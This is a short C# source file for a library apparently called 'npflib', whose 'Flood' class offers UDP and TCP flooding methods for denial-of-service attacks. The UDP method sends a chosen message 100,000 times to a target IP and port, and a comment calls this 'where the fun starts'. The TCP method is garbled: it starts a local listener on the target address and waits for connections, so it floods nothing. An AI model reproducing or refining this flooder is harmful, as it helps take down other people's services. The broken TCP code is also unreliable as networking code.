using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace npflib
{
    public class Flood
    {
        public string Udp(string ipaddr, int port, string message)
        {
            UdpClient client = new UdpClient();
            int i = 0;
            while (i != 100000)
            {
                client.Connect(ipaddr, port); // this is where the fun starts 
                byte[] sendBytes = Encoding.ASCII.GetBytes(message);
                client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                client.AllowNatTraversal(true);
                client.DontFragment = true;
                i = i + 1;
            }
            return "UDP flood done.";
        }
        public string Tcp(string ipaddr2, int port2, string message)
        {
            IPAddress ipaddr = IPAddress.Parse(ipaddr2);
            Int32 port = port2;
            int i = 0;
            while (i != 100000)
            {
                using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
                {
                    var server = new TcpListener(ipaddr, port);
                    server.Start();
                    TcpClient client = server.AcceptTcpClient();

                    NetworkStream stream = client.GetStream();
                    String data = message;
                    byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
                    stream.Write(msg, 0, msg.Length);
                    i = i + 1;
                }
            }
            return "TCP flood done";
        }
    }
}
